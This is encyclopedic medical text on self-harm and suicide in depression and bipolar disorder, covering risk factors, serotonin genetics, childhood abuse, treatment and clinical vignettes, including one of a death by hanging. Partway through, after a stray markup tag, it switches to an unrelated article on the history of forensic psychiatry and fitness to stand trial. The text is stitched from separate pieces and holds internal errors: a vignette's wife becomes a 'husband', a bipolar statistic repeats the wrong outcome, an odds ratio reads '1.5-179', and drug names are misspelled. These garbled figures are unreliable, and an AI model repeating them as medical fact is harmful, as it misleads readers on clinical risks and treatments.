Studies have found that up to 90% of individuals who present with self harm meet diagnostic criteria for psychiatric disorders. The most common is depression, followed by substance use disorders and anxiety disorders (Skegg, 2005). General population studies have indicated that individuals with psychopathology are at increased risk of self harm and suicide. Individuals with antisocial and borderline personality disorders exhibit high rates of self harming behaviors. Eating disorders, schizophrenia and post traumatic stress disorder have also been found in study samples of self harmers (Skegg, 2005). Treating underlying psychopathology may reduce risk in affected individuals.

=====Deliberate Self-Harm (DSH) and Depression=====
	
While DSH is almost always associated with dysphoria, it is not always associated with the syndrome of depression. DSH can occur in the setting of depression associated with both bipolar disorder and unipolar major depressive disorder. Haw et al. (2001) when he looked at a cohort of 106 patients who presented to a hospital following an episode of DSH found that 92% of these patients had a psychiatric diagnosis and that the most common diagnosis was affective disorder (72% using ICD-10 criteria).

Early adverse life events have a major impact on subsequent mood states. Similarly, early adversity is a major correlate of subsequent DSH behaviors (Gladstone et al. 2004; Parker et al. 2005). Gladstone et al. (2004) examined DSH behaviors, personality characteristics, and childhood variables, including parental styles and childhood sexual/physical abuse, among 125 women with depressive disorders. Findings indicated that participants who were victims of childhood sexual assaults were more likely to engage in DSH as adults (Gladstone et al. 2004). In addition, respondents who were victims of childhood sexual abuse became depressed earlier in life than non-abused controls (Gladstone et al. 2004).

Adolescents with DSH generally have less severe depressive symptoms than individuals with suicidal ideation, but more severe symptoms than those without any history of self-injurious ideation. In a community sample, adolescents who have a history of self-harm reported more depressive symptoms than those without a self-harm history (Muehlenkamp et al. 2004). In a study of 218 adolescents, ages 13-19, who were receiving outpatient treatment for a depressive mood disorder, adolescents who had DSH behavior had less severe depressive symptoms than those with suicidal ideation or suicide attempts (Tuisku et al. 2006). Similarly, among adults the degree of seriousness of a self injurious act was associated with depression and with intent. In a study of 49 prisoners in Germany, measures of depression and hopelessness were both highly correlated with suicidal intent and lethality; less lethal methods were not correlated with depression (Lohner et al. 2006). Impulsive acts of self-harm were rarely associated with depression (Lohner et al. 2006).

DSH behaviors are not fixed over the life time. For example, 70% of 132 adolescents who had deliberately poisoned themselves and who were followed for 6 years stopped the self-harm behaviors within 3 years of the index event (Harrington et al. 2006). DSH continued into adulthood mainly among those with psychiatric disorders. Only 56% of these study participants had a psychiatric disorder, and the most common psychiatric diagnosis was depression (Harrington et al. 2006). DSH behaviors may appear de novo in the elderly. Lamprecht et al. (2005) looked at older people presenting to an acute hospital with an episode of DSH. Sexual distribution among males and females was equal. Only 37% had a major depressive illness at the time of the DSH assessment, but 21% of the males had no psychiatric diagnoses at the time of the DSH (Lamprecht et al. 2005).

In young adults, the lack of depression in subjects with DSH has also been noted. Among 1,986 high-functioning military recruits (62% male), only 10% of those with a history of DSH reported depressive symptoms on the Beck’s Depression Inventory (Klonsky et al. 2003). Peers viewed self-harmers as having strange and intense emotions and a heightened sensitivity to interpersonal rejection (Klonsky et al. 2003).
Given that DSH may not necessarily be associated with depression, why does it occur? Tzemoz and Birchwood (2006) examined dysfunctional thinking patterns and intrusive memories in patients diagnosed with both unipolar depressive and bipolar mood disorders. They recruited 49 participants diagnosed with major depression, manic, or hypomanic episodes. Twenty healthy controls were also recruited from the same areas in Central England. Compared to the healthy controls, dysfunctional attitudes were abnormal in the mood disordered groups when ill (Tzemoz and Birchwood, 2006). Interestingly, whereas dysfunctional attitudes resolved in bipolar subjects as they became euthymic, they persisted into euthymia for those diagnosed with unipolar major depression (Tzemoz and Birchwood, 2006).

=====Deliberate Self Harm and Bipolar Illness=====

Intentional self harm in mania is rare and is probably related to the depressed mood that can occur during manic episodes (Ostacher and Eidelman, 2006). However, DSH during bipolar depressions is more common than DSH in unipolar depressive illness (Parker et al. 2005). Parker et al. (2005) reported that across samples of depressed individuals, more individuals with bipolar disorder tended to report DSH behaviors compared to those with unipolar depression. Smith et al. (2005) examined the prevalence rates of bipolar disorders and major depression among 87 young adults with recurrent depression; 83.9% of study respondents met criteria for major depressive disorder, 16.1% met criteria for a DSM-IV-defined bipolar disorder. The authors reported that among the respondents diagnosed with major depression, 45.7% had a history of DSH, and 13.0% had a history of a previous suicide attempt. Of the 14 respondents diagnosed with BP disorder, 71.4% had DSH and 28.6% had a history of deliberate self-harm.

One of the best known occurrences of DSH was performed by Vincent van Gogh (1853-1890), a Dutch Impressionist artist who had bipolar disorder (Jamison, 1993). On Christmas Eve in 1888, Van Gogh cut off his own earlobe with a razor blade as he was apparently attempting to attack an acquaintance. Following this episode of self-harm, van Gogh exhibited alternating states of &quot;madness and lucidity,&quot; and received treatment in an asylum in Saint-Remy. Two months after his discharge from the asylum, he committed suicide by shooting himself &quot;for the good of all&quot; (Anonymous, 2007).

=====Mood Disorders and Suicide=====
      
Suicide, the act of ending one’s life, is the most dramatic form of self-harm. Epidemiologic research indicates that in 2004, 31,484 individuals in the US died from suicide or self-inflicted injury (10.8 per 100,000 population) (Center for Disease Control, 2006). Extensive research has examined risk factors for suicide, and several studies have identified a history of prior suicide attempts as a very strong predictor of suicide risk (American Psychiatric Association, 2003; Borges et al. 2006; Gaynes et al. 2004). Certain sociodemographic characteristics have also been associated with high suicide risk. These include male gender, European-American ethnicity, and advanced age. However, the National Comorbidity Survey Replication Study, found that low income, &quot;non-Hispanic Black&quot; (p. 1750) ethnicity, and age less than 45 were significant correlates of suicide ideation (Borges et al. 2006). Additional risk factors include the presence of a psychiatric disorder, particularly depression, alcohol abuse, physical and sexual abuse, and a family history of suicide (Gaynes et al. 2004). Psychiatric disorders may be present in up to 90% of those who commit suicide (American Psychiatric Association, 2003). Divorced, separated, or widowed individuals have a higher risk of suicide (American Psychiatric Association, 2003). Conversley, high-conflict or violent marriages may increase the risk for suicide among married individuals (American Psychiatric Association, 2003).

'''''Unipolar Depression and Suicide''''' 

Numerous studies have identified depression as a significant risk factor for suicide.  This contributes to mortality rates associated with depression that are approximately 20 times higher than the general population (American Psychiatric Association, 2003).  The fraction of people who have committed suicide that were depressed at the time of their death has been estimated to range from 15% (Rich et al. 1986) to 97.5% (Sinclair et al. 2005).  However, most studies, including those that are based on psychological autopsies, estimate a rate of 30-34% (Arato et al. 1988; Henriksson et al. 1993; Foster et al. 1999).  The fraction of adolescent suicides that involve depression may be slightly higher at 43% (Brent et al. 1999).
      
Co-morbid psychiatric conditions may additionally increase the risk for suicide.  Paramount among these is co-occurring substance use which accounts for some 45% of completed suicides (Rich et al. 1986).  Additionally, aggression (Dervic et al. 2006; Keilp et al. 2006) and cluster B personality disorders (Dervic et al. 2006) are associated with suicide attempts in depressed individuals with a history of childhood sexual abuse. 
      
A decline in depression and hopelessness was associated with a decline in suicidal ideation in 198 people diagnosed with major depression (Sokero et al. 2006).  There is a close correlation between the increased use of antidepressants and an observed decline in overall suicide rate (Korkeila et al. 2007; Gibbons et al. 2006), but this trend may have begun prior to the introduction of antidepressants (Safer and Zito, 2007).  Antidepressants may have no effect on suicide ideation (Hammad et al. 2006) or may actually increase the risk of suicide attempt among depressed adults (Tiihonen et al. 2006) and suicide ideation among adolescents (Bridge et al. 2007; Dubicka et al. 2006), but may reduce completed suicides (Tiihonen et al. 2006).  The United States Food and Drug Administration (FDA) has placed a warning on all antidepressants, that they may increase suicidal ideation in adolescents (Kuehn, 2007).  While lithium is rarely used in major depressive disorder, it appears to have an anti-suicide effect, similar to that seen in bipolar illness (Guzzetta et al. 2007).


''Vignette #2''

John was a 61 year old male who presented to the emergency room with a 7cm laceration on his left inner forearm. The laceration was moderately deep and required multiple sutures. There were no other signs of current or former abuse on his arms or the rest of his body. 
After John’s arm was sutured, he was evaluated by a psychiatrist for a possible suicide attempt. John revealed that he was in a marriage that had not been healthy for quite some time and that his wife had called to say she was not coming home and that she wanted a divorce. John decided he could not face life without his wife and saw no way to call for help so cut himself. He denied suicidal intention at the time of the injury and denied it again at the time of the interview. John could not identify any social support persons and did not have any plans for the future. He kept insisting that he needed to go home but would not say what he needed to do there.
John’s past history was significant for physical abuse by his father when he was a child. His father then left  when he was 11 years old. His mother was not emotionally available and was overwhelmed at being left with 4 children to care for when she only had a minimum wage job. John was on his own for most of his teen age life. As the oldest child, he was responsible for helping with the other 3 children when his mother was not around. John related that he had always thought the marriage to his husband was going to be different from his mother’s and was not going to end in divorce. He said he felt like it was all his fault and he would never find another person to love him.
John’s psychiatrist felt that he was a risk for attempting suicide when he returned home and placed him in a psychiatric hospital for safety and stabilization.


'''''Bipolar Disorder and Suicide ''''' 

Lifetime prevalence of all bipolar disorders is approximately 2%; bipolar I disorder has a incidence rate of 0.8%, compared to 1.2% for bipolar II disorder. Suicide risk is high in bipolar disorder. Angst et al. (1995) followed 406 patients for 36 years; findings indicated that 11% committed suicide, regardless of whether patients were diagnosed with type I or II disorder. Other estimates approach 19% (Ostacher and Eidelman, 2006). The risk appears higher than in unipolar major depression. Chen et al. (1996) examined data from the Epidemiologic Catchment Area Study (ECA) to estimate lifetime rates of suicide attempts in mood disorders; findings indicated that 29.2% of respondents with bipolar disorder attempted suicide, compared to 15.9% among those with unipolar depressive disorder.
Additionally, when subjects with bipolar disorder attempt suicide, the lethality of that attempt may be greater. Among 2,395 hospital admissions of patients with unipolar depression and bipolar disorder subjects with bipolar disorder had a higher incidence of more lethal suicide attempts (Raja et al. 2004). The odds of completed suicide in those with bipolar disorder is 2.0 times higher compared to those with unipolar depression (Raja et al. 2004). However, prevalence rates of suicide may be inflated, since researchers typically focus on hospitalized patients and those who have received treatment from a mental health provider. This self-selected population may be more ill compared to those who receive treatment from primary care providers, or those who do not receive any psychiatric treatment.
Risk for suicide is highest during a depressive episode of bipolar disorder. Isometsa et al. (1994) found that among patients diagnosed with bipolar disorder, 80% of completed suicides occur during a depressive episode. Mortality from suicide in bipolar depression may be 30 times that of normal controls (Ostacher and Eidelman. 2006). However suicidal ideation and suicide completions may occur during the mixed (Dilsaver et al. 1994) or even manic phase (Cassidy et al. 2001). Rapid cycling also carries a higher likelihood for more serious suicide attempts but not an increase in completed suicides compared to other types of episodes (42 vs 27%) (MacKinnon et al. 2003).
Suicide risk is highest in newly diagnosed bipolar patient. Fagiolini et al. (2004) found that among 104 patients with bipolar disorder, 50% attempted suicide within 7.5 years of the initial onset of the illness (either mania or depression). In these young bipolar patients, suicide rarely occurs during episodes of mania.
Lithium appears to have a clear effect on reducing completed suicide in bipolar patients with a five fold reduction in relative risk (Baldessarini et al. 2006; Tondo et al. 2001). More impressively, lithium reduces non-suicidal DSH and non-psychiatric mortality in bipolar patients (Cipriani et al. 2005).


''Vignette #3''

Dick was a 24 year old young man in law school when he had his first manic episode. He had a history of a depressive episode that had been difficult to treat when he was 18 but had not had any problems since that time and was not on any medications at the time of this manic episode. During the episode, he lost his job, his relationship with his girlfriend and he spent thousands more dollars than he could afford to spend in cars, jewelry, vacations and gifts to his girlfriend. He was hospitalized and stabilized on appropriate anti-manic medications. Approximately 4 months later, Dick began another depressive episode. This time he was thinking of all the things he had lost. He felt like his life as a lawyer was over and that he was destined to be a disabled person with no job, no family and no friends for the rest of his life. He did continue to take his medicines and see his psychiatrist but did not discuss any of these thoughts with any of his support persons. 2 months after the depressive episode began, Dick was found in his home, having hung himself from a rafter in the garage. 


'''''Serotonin System and Suicide'''''

On a molecular level, the serotonin system has been implicated in self harm population studies. Low levels of 5 HIAA have been found in cerebrospinal fluid in self-harmers (Skegg, 2005). There are many biological associations between mood symptoms and aggression or violence. These include increased aggression with increased cytokine activity (Zalcman and Siegel, 2006), catecholamine metabolism (Volavka et al. 2004), testosterone (Pope et al. 2000), and hypothalamic-pituitary-adrenal axis dysfunction (Shea et al. 2005; Malkesman et al. 2005). However, the most consistent findings are with the serotonergic system.

Among the many findings associated with serotonergic dysfunction in aggression, platelet serotonin 2A receptor (5-HT2A) binding was increased in subjects with trait aggression (Lauterbach et al. 2006). Prefrontal cortical 5-HT2A binding was also increased in aggressive suicidal patients (Oquendo et al. 2006). Similarly, relative increases in plasma tryptophan levels (a precursor to serotonin) are associated with increased aggression and hostility (Lauterbach et al. 2006; Suarez and Krishnan. 2006) Lower CSF 5-HIAA concentration was independently associated with severity of lifetime aggressivity and a history of a higher lethality suicide attempt and may be part of the diathesis for these behaviors. The dopamine and norepinephrine systems do not appear to be as significantly involved in suicidal acts, aggression, or depression (Placidi et al. 2002). However, the most compelling findings regarding the involvement of serotonin in both mood disturbance and violence is found in the serotonin transporter polymorphisms.

Several recent studies have investigated the role of polymorphisms in the serotonin reuptake pump or the serotonin transporter gene (5HTTLPR). A common polymorphism of this gene is a deletion in the area of the gene that regulates its transcription into messenger RNA, and ultimately translation into expressed protein, the promoter region. Individuals with this deletion, called the short or &quot;s&quot; allele, express fewer serotonin transporters. Individuals who are homozygous for the &quot;s&quot; allele (ss), are more likely to develop depression (OR 1.5-179) (Cervilla et al. 2006) and depression after a traumatic event (Kaufman et al. 2004; Caspi et al. 2003). Thus, the observed link between early life adversity, or later life trauma, and subsequent depression, is related, at least in part, to having the ss genotype (Kaufman et al. 2004; Caspi et al. 2000). While stressful life events or extreme adversity are clearly associated with subsequent depression, adversity is quite potent in inducing depression in subjects with the ss genotype; so that the dosage of adversity required to produce depression is much lower in individuals homozygous for the short form of the 5HTTLPR (Cervilla et al. 2007). Several studies have also found that the ss genotype is also associated with subclinical depressive symptoms in individuals without depression (Gonda et al. 2005, 2006; Gonda and Bagdy, 2006).

The ss genotype of the 5HTTLPR is also associated with aggression. In a case control study of conduct disorder with or without aggression, it was found that the ss genotype was strongly associated with aggression but not conduct disorder without aggression (Sakai et al. 2006). A positron emission tomography (PET) study of 5HRRLPR density found that reduced transporter density is associated with impulsive aggression (Frankle et al. 2005). While this study did not examine the genotype of the study subjects, it found that the phenotype that is expected with the ss genotype is associated with aggression (Frankle et al. 2005). Among schizophrenic patients who attempted suicide, the ss genotype of the 5HTTLPR was associated with violent suicide attempts but not with non-violent attempts nor with non-attempters (Bayle et al. 2003).

====Psychological Factors====

Many psychological factors may also contribute to self harm and suicidal behaviors.  It has been suggested that rage towards others, feelings of abandonment, guilt or desperation may play a role in these behaviors at a subconscious level (Skegg, 2005).  Poor problem solving skills, impaired decision making skills and factors that contribute to the former have been studied and indicated as risk factors in those who harm themselves (Skegg, 2005).   Neuroticism, dissociation and novelty-seeking personality traits are associated with suicide and self harm (Skegg, 2005).  

=====Direct Abuse or Neglect=====
Childhood abuse and neglect are clearly associated with a substantial increase in the risk for subsequent depression and maladaptive behaviors (Cukor and McGinn, 2006; Reigstad et al. 2006; Widom et al. 2007).  This is true in all cultures in which it has been studied (Afifi, 2006).

=====Verbal and Emotional Abuse=====  

The experience of verbal abuse during childhood (e.g., &quot;you are stupid&quot;) increases depression, anger and hostility in young adults (Teicher et al. 2006; Sachs-Ericsson et al. 2006).  Verbal and emotional abuse influence the development of self-concept, and lead to a self-critical style of cognitive processing that contributes to low self esteem (Cukor and McGinn, 2006; Sachs-Ericsson et al. 2006).  This impaired self-image may be one of the underlying phenomena that increase the risk of subsequent sexual victimization as a young adult (Rich et al. 2005).  
	
=====Physical Abuse=====  

Physical abuse may be a major contributing factor in the development of violence in later life (Huizinga et al. 2006).  Physical abuse is also pivotal in the development of depression in youths and on into adulthood (Widon et al. 2007; Cukor and McGinn, 2006; Reigstad et al. 2006; Wright et al. 2004).  Physical abuse may occur in either the home environment or in school.  Bullying is a form of verbal and physical violence that can have major impact on development.  The odds of experiencing social problems, depression with suicidal ideation and attempts are 3.9 times higher among victims of bullying compared to non-victims (Brunstein Klomek et al. 2007; Kim et al. 2006). Furthermore, bullying behaviors have been linked to mood disturbances. The odds of bullies developing social problems, depression, and suicidality are 1.8 times higher compared to people who are not bullies, and bullies who are also targets of other bullies are 4.9 times as likely to develop social problems (Brustein Klomek et al. 2007; Kim et al. 2006).  High profile school shooters, such as Columbine High School or Virginia Tech University, have been bullied by class mates.

=====Sexual Abuse=====  

Sexual abuse of children is associated with a wide variety of physical and psychological sequelae, many of which are life-long.  Early sexual abuse is associated with a significant increase in depression in both males and females (Peleikis et al. 2005; Conway et al. 2004; Gladstone et al. 2004; Martin et al. 2004).  The risk of subsequent suicide attempts is 15 times higher in boys who experience early sexual abuse compared to non-abused boys (Martin et al. 2004); among women suicide ideation is 4.5 times higher (Masho et al. 2005).  The consequences of childhood sexual abuse includes greater severity of depressive illness in adult patients over age 50 (Gamble et al. 2006; McGuigan and Middlemiss, 2005).  Adult women who have experienced childhood sexual abuse are more likely to be victims of violence (Gladstone et al. 2004) and other forms of trauma, including sexual assault (Rich et al. 2005; Banyard et al. 2002).  Sexual abuse perpetrated by adult women can be just as harmful as sexual abuse perpetrated by men (Denov, 2004).

====Social/Cultural Factors====

Experiences early in life may be an important risk factor for later self harm.  Children of divorced parents, women of low education or socioeconomic status and children of parents with psychopathology are at higher risk of deliberate self harm (Skegg, 2005).  Trauma early in life such as physical, sexual or emotional abuse and exposure to household violence has been identified as risk factors (Skegg, 2005). It has been difficult to determine if these experiences are independent risk factors, or if they lead to impairment in relationships that may also be a risk factor for self harm (Skegg, 2005).
	
Social support appears to play a key protective role in self harming behaviors as evidenced by groups of people who have been found to be a higher risk.  Divorced and separated individuals are at a higher risk, as are unemployed individuals.  It has been found that social support reduces self harming behaviors and moderate stress (Skegg, 2005).  Multiple studies have also found moral obligations and religious beliefs to be protective against suicide (Skegg, 2005). 

==Treatment==

Risk assessment and the patient’s ability to follow through with treatment are key factors in determining treatment modality in the suicidal patient.  Depending on the circumstances, treatment can range from involuntary hospitalization on secure psychiatric wards to outpatient clinic follow-up.  Treatment should be carried out in the environment that is least restrictive, but includes adequate measures for safety. Goals of management include establishing a therapeutic alliance, establishing safety and determining the patient’s needs.  Incorporating the patient’s individual needs into the treatment plan is important to promote adherence (APA practice guidelines).  
	
When establishing the therapeutic alliance, it is important for the psychiatrist to be aware of countertransferance and transference reactions between themselves and the suicidal patient. Dealing with suicidal individuals can uncover the psychiatrist’s own feelings about death and suicide and may provoke anger in some. On the other hand, some patients with a strong desire to die may become angry at the treating physician, and others may have a desire to be saved instead of taking responsibility for their own actions (APA practice guidelines).
	
Attending to the patient’s immediate safety is a priority in the treatment setting, especially in the acute phase.  In the emergency setting, it is imperative to remove personal objects that the patient could use to harm themselves.  Removing personal items such as purses and shoestrings that the patient could use to harm themselves may be necessary on inpatient units.  Close surveillance via frequent safety checks or surveillance cameras may be necessary in acutely suicidal individuals (APA practice guidelines).
	
A balance between suicide risk and risk associated with hospitalization must be accomplished to determine the most appropriate setting. While establishing safety is a priority, there are also effects of hospitalization that may have negative effects on a patient’s life situation. These include financial risks including hospital bills and lost time from work, social stigmatization and psychosocial stressors.  Generally, hospitalization is indicated when patients are at high risk of self harm, have new onset of suicidal behaviors, require treatments that can only be performed in the hospital setting, or are unable to comply with less restrictive treatment options (APA practice guidelines).

====Pharmacotherapy====

Evidence clearly indicates that underlying mood disorders must be treated to optimize treatment in the suicidal or self-harming patient as discussed above in the pathogenesis discussion.  A brief summary of findings regarding specific classes of drugs as related to self-harming behaviors is included below.
	
=====Antidepressants=====
	
According to the American Psychiatric Association practice guidelines, pharmacotherapy is commonly used in suicidal patients suffering from depression and anxiety disorders.  They have also been used to treat suicidal patients with comorbid substance disorders.  However, limited evidence based studies exist to support that this treatment modality reduces rates of suicide.  Studies using FDA databases do not show differences in rates of suicide with the use of antidepressants (APA practice guidelines).  
	
Conflicting evidence exists regarding the increased incidence of suicide following SSRI treatment.  Several case reports were published, however, and patients should be educated regarding these findings.  However, clinicians must be careful to not neglect treatment of real mood pathology due to fear.
	
=====Lithium=====
	
The APA practice guidelines identify treatment with lithium salts as an evidenced based treatment to reduce suicide risk in patients with bipolar disorder and major depressive disorder.     They report that this treatment has been shown to decrease suicidal acts by 14-fold.  Practitioners should be aware of the high lethality of overdose on lithium when prescribing quantities to potentially suicidal patients.
	
=====Other Mood Stablilzers=====
	
Anti-convulsant agents are frequently used as mood stabilizer therapy.  They may reduce suicidal behaviors, however, are not as evidenced supportive as Lithium (APA practice guidelines).

=====Atypical Antipsychotics=====
	
Atypical antipsychotics are commonly used to reduce hallucinations, delusions, agitation, aggression and contusion, which may reduce self-harm and suicidal behaviors.  These agents are indicated for use in patients with schizophrenia, schizoaffective disorder, and mood disorders with psychotic features.  These include aripiprazone, clozapine, olanzapine, quitiapine, risperidone and ziprasidone.  Clozapine is typically reserved for patients who do not respond to other agents due to side effects. For the same reason, typical antipsychotics are usually reserved for people not responding to newer agents (APA practice guidelines).

=====Antianxiety Agents=====
	
Theroetically, antianxiety agents would have the potential to reduce suicide and self-harm risk since anxiety is a risk factor.  However, studies are limited.  Agents commonly used are benzodiazepines and buspirone. 

====Psychotherapy====

Since suicide is relatively rare in the general population, it is difficult to conduct studies with enough events to reach statistical significance.  A meta-analysis of psychosocial interventions by Crawford et al. (2007) suggests that specific psychosocial interventions following acts of self-harm do little more than standard care to prevent subsequent suicide.  Of the interventions studied, Cognitive Behavioral therapy appeared to have a trend towards reducing risk of suicide.  Overall mortality in the intense intervention group was lower, however.  Interventions that improve existing mood symptoms will ultimate reduce self destructive behaviors as discussed above.

      <text xml:space="preserve">Originally forensic psychiatrists were part of an obscure and small group of &quot;alienists&quot; who were dedicated to the study of mental conditions and their treatment among prisoners.  At present they form part of an established and recognized group of super-specialists who have made deep incursions into the workings of the law and are transforming the practice of psychiatry.  This influential status has not come without some misgivings about the basic identity of Forensic Psychiatry as a medical specialty and concerns about its utility and its ethics.  Following definitional issues and a short historical review, this paper will describe modern developments of this specialty and comment on the ethical controversies surrounding its functions.

Forensic Psychiatry is a subspecialty of Psychiatry, which in turn, is a medical specialty.  It is commonly defined as &quot;the branch of psychiatry that deals with issues arising in the interface between psychiatry and the law&quot; (Gutheil, 2004).  Although short, to the point, and simple, this definition fails to emphasize that a good portion of the work in Forensic Psychiatry is to help the mentally ill who are in trouble with the law navigate three different, sometimes inimical, but interrelated systems: mental health, justice and corrections.  Arboleda-Flórez (2006) has proposed a more encompassing definition that will cover the specific problems of managing the mentally ill offender: &quot;Forensic Psychiatry is the branch of psychiatry that deals with issues arising in the interface between psychiatry and the law, and with the flow of mentally disordered offenders along a continuum of health and social systems.&quot; 

Forensic Psychiatry is broad.  Not only does it deal with matters related to criminal law, it also deals with civil law, and the development and application of mental health legislation.  Unlike any other specialty in Medicine, including Psychiatry, where the work is done at the request of the patient and takes place within the confines of a highly private and confidential bilateral relationship between physician and patient, the work in Forensic Psychiatry is done at the request of a third party.  The forensic encounter takes place in a triangular relationship that flows from the dictates of the Law that are binding on both the patient and the physician and on the agency requesting the assessment.  These arrangements and the settings in which forensic psychiatrists do most of their work give the subspecialty three unique and clearly defined characteristics: 

1. A specific clinical subject matter and management considerations  
 
2. Knowledge of legal constructs and concepts in criminal law,  civil law, and legislation 

3. Working with a complex set of relationships within three social systems - medicine, justice and corrections.

== Historical Review ==

A relationship between mental constructs and the Law has existed since antiquity and is already found in the Baba Ramma, an ancient codification of texts.  In Egypt, Imhotep, the grand vizier of the Pharaoh Zoser may have been the first &quot;medico-legal expert.&quot;  In the Bible, the book of Deuteronomy makes reference to crime and punishment - God’s punishment for transgressions of His commands was to visit on the violator &quot;madness, and blindness, and astonishment of the heart&quot; (mania, dementia, stupor).  

The Romans codified the close relationship between mental states and the Law in the Corpus Iuris Civilis that contains a list of mental conditions that could serve as defense for criminal responsibility.  Some other Roman legislation included the Twelve Tables, in which provisions are made for a system of guardianship of the insane; the Lex Aquila that exonerated those who caused damage not by negligence or malice, but by accident and the Lex Cornelia that excused children and the insane from punishment. 

Henry de Bracton, around 1256, may have been the first legal scholar to attempt to identify the degree of legal impairment needed to exculpate an offender.  In the first systematic treatise on English Law, written in the thirteenth century, he stated, &quot;an insane person is one who does not know what he is doing and is lacking in mind and reason.&quot;  

Medical experts were used in court proceedings in Bologna and other Italian cities during the XV century and in Freiburg, Germany.  The scientific understanding of criminal behaviour and the expected legal proofs of wrongdoing as opposed to hearsay evidence were considered extensively in the Constitutio Carolina (1532).  In 1654, Zachia, possibly the father of legal medicine, upgraded the Corpus Iuris Civilis with his Questiones medico-legales for use by the Sacred Rota, the highest judicial body of the Roman Catholic Church.  In 1736 Matthew Hale published, posthumously, his History of the Pleas of the Crown in which he introduced the concept of partial insanity (Prosono, 1994). 

Bracton’s legal definition of insanity based on the concept of &quot;does not know&quot; still reverberates, as it constitutes the basic formula in the McNaughton rule, which is central to our current understanding of ‘not guilty by reason of insanity’.  The case of Daniel McNaughton in 1843 made history in the English world.  McNaughton had a paranoid delusional system believing that the Prime Minister, Mr. Peel, was planning to make England go back under the authority of the Pope in Rome. In his attempt to kill the Prime Minister, he mistakenly murdered his private Secretary, Mr. Drummond.  McNaughton was acquitted on the grounds of insanity, but not under the rules that bear his name.  The finding prompted the Queen to ask a Panel of Judges for clarification of the rules for acquittal on the grounds of insanity, which resulted in the McNaughton rules for insanity defense that are in use in most of the English world even to the present.  This rule based the determination of insanity on &quot;lack knowledge of the act.&quot;  

Forensic Psychiatry has grown exponentially since Bracton’s times.  Contemporary Forensic Psychiatry provides methodologies for the assessment of persons presumed to have some mental condition and who are caught in the midst of criminal or civil law proceedings.  Forensic Psychiatry has benefited from four key important moments in legal-psychiatric thinking: 
1. Increased knowledge of the relationship between mental illness and criminality. 
2. Evolution of forensic legal operations in criminal and in civil law. 
3. Developments in systems interactions.  
4. A deeper understanding and concern about issues in biomedical ethics.

These four moments underlie the expansion recently seen in Forensic Psychiatry from issues entirely related to criminal prosecutions and the treatment of mentally ill offenders to many other fields of Law and mental health policy. 

== Relationship between Mental Illness and Criminality ==

Worldwide, a wider understanding of the relationship between mental states and crime has led to an increased utilization of forensic experts in courts of law at different levels of legal action.  The ways in which Forensic Psychiatry and Penal Law interface are varied and numerous within the criminal process, which expands from the moment of arrest to the time a convict finishes his or her sentence and is fully released back to the community.  Forensic psychiatric systems could be called upon to work hand in hand with the justice/correctional system at each stage of the criminal process.  At the moment of arrest the police could divert a clearly mentally ill person to a hospital emergency for assessment and treatment if required, including possible hospitalization, or detain the person and proceed to book for an appearance before a magistrate or lower judge.  The judge could keep the person in a jail pending a decision, or, depending on the case, the accused could be transferred to a higher court.  At this stage the accused could be found innocent and released, an assessment could be ordered to determine fitness to stand trial or criminal responsibility (vide infra), or the person could be found not criminally responsible because of a mental condition.  Finally, the person could also be found guilty and sentenced to a prison term. 

The multiple entanglements between psychiatric systems and the legal system are based on the recognition in traditional legal doctrine and contemporary public policy that a population exists in which mental disorders are related to criminal behaviour.  In fact, in many jurisdictions, mental health legislation makes dangerousness associated with a mental condition, or the potential to cause grievous bodily harm to self or others, the main criterion for civil commitment (Appelbaum, 1994; Arboleda-Flórez and Copithorne, 1998).  Criminal Codes in most countries also assume that a relationship exists between mental states and criminal offending and that this relationship may be determinative in the outcome of a commitment hearing or criminal trial.  Whether this putative relationship between crime and psychopathology is causal or one of social convenience is a matter of much controversy given some convergence between the two sets of phenomena (mental illness and criminal behaviour) and specific legal procedures that apply to mentally ill offenders.
 
With respect to convergence, it is important to differentiate clinical pathology from criminal behaviour.  While socially abnormal behaviour should not be automatically considered a manifestation of mental illness, there are mental disorders whose very behavioural manifestations are, ipso facto, criminal offenses.  For example, persons affected with sexual disorders, firesetting and compulsive stealing become criminal the moment their symptoms are expressed, because the symptom is a criminal act.  In these cases, the convergence between symptom and criminality is absolute.  

In many other disorders, symptoms can be expressed without necessarily breaking the law, such as in addictions, personality, or impulse control disorders.  Any convergence in these disorders flows through other social and legal considerations.  For example, in some countries mere possession of alcohol is an offense.  

Finally, in most cases, convergence is not straightforward. An example is the presumed relationship between serious mental illnesses (such as schizophrenia or depression) and violence toward others.  The vast majority of people experiencing these disorders never commit an act of violence or a criminal offense.  Indeed, they are more often the victims of violence than the perpetrators.

In most countries specific legal procedures apply to persons charged with a criminal offence, but who may be also mentally ill.  These procedures form part of Criminal or Penal Law, the section of the Law that deals with criminal sanctions for crimes against property or persons.  As the State has an interest in protecting its citizens, breaches of the law affecting a citizen imposes an obligation on the State to find the culprit and bring him or her to justice.  While the aggrieved citizen may not be seeking revenge, it is important to demonstrate that justice has been done and that perpetrators are properly punished.  Criminal Law relates to regulations and sanctions the Law prescribes to lawbreakers whether for misdemeanors or felony offences and the ways in which exculpatory reasons such as mental illness could be used to minimize the punishment.  

Exculpatory procedures based on the presence of a mental condition are based on the fact that there are occasions when mental illness could negate one of the two elements required by law to judge the accused.  The first element is an acknowledgment by all involved that a crime has been committed, actus reus, and that the accused most probably did it.  The second element is a considered decision by the Judge alone or with the help of mental health experts, that the act not only took place, but that the perpetrator had the full intention and was fully conscious of what he or she was doing at the time the act took place, besides being aware of the consequences of the act.  This is known as having a guilty mind or mens rea.  A forensic psychiatric assessment is usually requested if there is any doubt that the person was mentally ill at the time the offence took place, or mentally ill at the time the person appears in court.  

== Forensic Legal Operations in Criminal Law ==

There are three major areas in Criminal Law that need consideration as it pertains to the involvement of forensic psychiatrists – fitness to stand trial, criminal responsibility and dangerous offender applications.  

Fitness to stand trial pertains to the condition of the accused at the time of the trial and is a legal requirement found in countries that follow the Anglo-Saxon common law system, but it is also found in other legal systems.  On appearing in court to face a charge, the law presumes that everybody is fit (or mentally competent to stand trial), but if the court is presented with information that the accused may be mentally ill, it may request a psychiatric examination.  If the person is found to be seriously mentally ill the court will order a transfer to a psychiatric institution for an in-patient assessment.  The decision that the person is not fit to stand trial remains always on the court, but the forensic psychiatrist is expected to provide an opinion about whether the person suffers from a mental condition, and whether that mental condition affects the parameters of fitness.  These parameters are rather simple; in most countries all it is required is to determine whether the person, on account of the mental condition is unable: 

1. To understand the nature and object of the legal proceedings

2. To understand the possible consequences of the proceedings, or 

3. To communicate with counsel.  

